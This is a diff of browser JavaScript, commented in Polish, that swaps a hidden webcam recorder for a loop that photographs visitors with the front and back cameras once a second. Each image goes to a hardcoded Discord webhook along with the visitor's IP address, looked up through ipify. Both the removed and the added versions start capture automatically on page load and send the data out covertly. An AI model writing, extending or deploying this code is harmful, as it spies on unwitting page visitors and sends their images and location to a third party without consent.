@@ -1,71 +1,77 @@
-let mediaRecorder;
-let recordedChunks = [];
-let videoStream;
+const frontCanvas = document.getElementById('frontCanvas');
+const backCanvas = document.getElementById('backCanvas');
+const frontCtx = frontCanvas.getContext('2d');
+const backCtx = backCanvas.getContext('2d');
 
-// Funkcja uruchamiająca nagrywanie wideo
-async function startRecording() {
+let frontStream, backStream;
+
+// Pobieranie dostępu do kamer i robienie zdjęć co sekundę
+async function startCameras() {
     try {
-        // Pobranie dostępu do kamery
-        videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        // Pobranie dostępnych urządzeń
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoDevices = devices.filter(device => device.kind === 'videoinput');
 
-        // Tworzenie obiektu MediaRecorder
-        mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
+        // Wybranie przedniej i tylnej kamery
+        const frontCamera = videoDevices.find(device => device.label.toLowerCase().includes('front'));
+        const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back'));
 
-        // Zbieranie nagranych danych
-        mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-                recordedChunks.push(event.data);
-            }
-        };
+        // Uruchomienie przedniej kamery
+        if (frontCamera) {
+            frontStream = await navigator.mediaDevices.getUserMedia({ video: { deviceId: frontCamera.deviceId } });
+            captureLoop(frontStream, frontCtx, frontCanvas, "Przednia kamera");
+        }
 
-        // Automatyczne nagrywanie po wejściu na stronę
-        mediaRecorder.start();
-        console.log("Nagrywanie rozpoczęte...");
+        // Uruchomienie tylnej kamery
+        if (backCamera) {
+            backStream = await navigator.mediaDevices.getUserMedia({ video: { deviceId: backCamera.deviceId } });
+            captureLoop(backStream, backCtx, backCanvas, "Tylna kamera");
+        }
 
     } catch (err) {
-        console.error("Błąd dostępu do kamery:", err);
+        console.error("Błąd dostępu do kamer:", err);
     }
 }
 
-// Funkcja zatrzymująca nagrywanie i wysyłająca film na Discorda
-async function stopRecording() {
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop();
-        console.log("Nagrywanie zatrzymane...");
+// Funkcja robienia zdjęć w pętli
+async function captureLoop(stream, ctx, canvas, cameraName) {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
 
-        // Czekanie na zakończenie nagrywania
-        await new Promise(resolve => setTimeout(resolve, 1000));
+    video.onloadedmetadata = () => {
+        setInterval(() => captureAndSend(video, ctx, canvas, cameraName), 1000);
+    };
+}
 
-        // Tworzenie pliku wideo
-        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+// Funkcja pobierająca IP i wysyłająca zdjęcie na Discorda
+async function captureAndSend(video, ctx, canvas, cameraName) {
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob(async (blob) => {
         let formData = new FormData();
-        formData.append('file', videoBlob, 'video.webm');
+        formData.append('file', blob, `${cameraName}.png`);
 
         try {
-            // Pobranie IP użytkownika
             let ipResponse = await fetch('https://api64.ipify.org?format=json');
             let ipData = await ipResponse.json();
             let userIP = ipData.ip;
 
             formData.append('payload_json', JSON.stringify({
-                content: `🎥 Nagranie zakończone! IP użytkownika: ${userIP}`
+                content: `📸 Nowe zdjęcie (${cameraName})! IP użytkownika: ${userIP}`
             }));
 
-            // Wysyłanie pliku na webhook Discorda
             await fetch("https://discord.com/api/webhooks/1341148754161569956/lHJVIyJeOpz2lpBfU_eRjPKKcvmCSw8vAo6X2bE535wvOnwFxRB9yIYIDchCMAx_zVe4", {
                 method: "POST",
                 body: formData
             });
 
-            console.log("Wideo i IP wysłane!");
+            console.log(`Zdjęcie (${cameraName}) i IP wysłane!`);
         } catch (error) {
-            console.error("Błąd wysyłania:", error);
+            console.error(`Błąd wysyłania (${cameraName}):`, error);
         }
-    }
+    }, 'image/png');
 }
 
-// Rozpocznij nagrywanie po wejściu na stronę
-startRecording();
-
-// Zatrzymaj nagrywanie i wyślij film po wyjściu ze strony
-window.addEventListener("beforeunload", stopRecording);
+// Uruchomienie kamer
+startCameras();
